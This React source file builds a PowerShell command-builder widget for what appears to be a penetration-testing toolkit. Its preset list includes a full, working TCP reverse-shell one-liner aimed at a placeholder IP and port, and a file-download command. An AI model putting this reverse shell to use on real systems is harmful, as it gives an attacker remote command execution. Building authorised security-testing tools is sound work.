import { useState } from 'react';
import { FaWindows, FaCopy, FaInfoCircle } from 'react-icons/fa';
import { toast } from 'react-toastify';
import { copyToClipboard } from '../../utils/copyToClipboard';

const PowerShellBuilder = () => {
  const [snippet, setSnippet] = useState('whoami');
  const [custom, setCustom] = useState('');

  const snippets = [
    { label: 'Current User', value: 'whoami' },
    { label: 'List Processes', value: 'Get-Process' },
    { label: 'List Services', value: 'Get-Service' },
    { label: 'Network Info', value: 'Get-NetIPAddress' },
    { label: 'Download File', value: 'Invoke-WebRequest -Uri <url> -OutFile <file>' },
    { label: 'Reverse Shell', value: 'powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient(\"<ip>\",<port>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + \"PS \" + (pwd).Path + \"> \\";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"' }
  ];

  const buildCommand = () => custom || snippet;

  const handleCopy = async () => {
    try {
      await copyToClipboard(buildCommand());
      toast.success('Copied!', { position: 'bottom-right', autoClose: 2000, hideProgressBar: true });
    } catch {
      toast.error('Failed to copy', { position: 'bottom-right', autoClose: 2000, hideProgressBar: true });
    }
  };

  return (
    <div className="command-builder">
      <div className="builder-header">
        <FaWindows className="icon" />
        <h2>PowerShell Command Builder</h2>
        <p>Windows automation and post-exploitation</p>
      </div>
      <div className="form-group">
        <label>Common Snippets <FaInfoCircle title="Select a common PowerShell command" /></label>
        <select className="select-input" value={snippet} onChange={e => setSnippet(e.target.value)}>
          {snippets.map(s => (
            <option key={s.value} value={s.value}>{s.label}</option>
          ))}
        </select>
      </div>
      <div className="form-group">
        <label>Custom Command</label>
        <input className="text-input" value={custom} onChange={e => setCustom(e.target.value)} placeholder="Type or paste your own PowerShell command..." />
      </div>
      <div className="command-preview">
        <div className="preview-header">
          <span>Preview</span>
          <button className="copy-button" onClick={handleCopy}><FaCopy /> Copy</button>
        </div>
        <code>{buildCommand()}</code>
      </div>
      <div className="info-tip">
        <FaInfoCircle className="icon" />
        <p>PowerShell is a powerful scripting language for Windows. Use with caution and only on systems you own or have permission to test.</p>
      </div>
    </div>
  );
};

export default PowerShellBuilder;
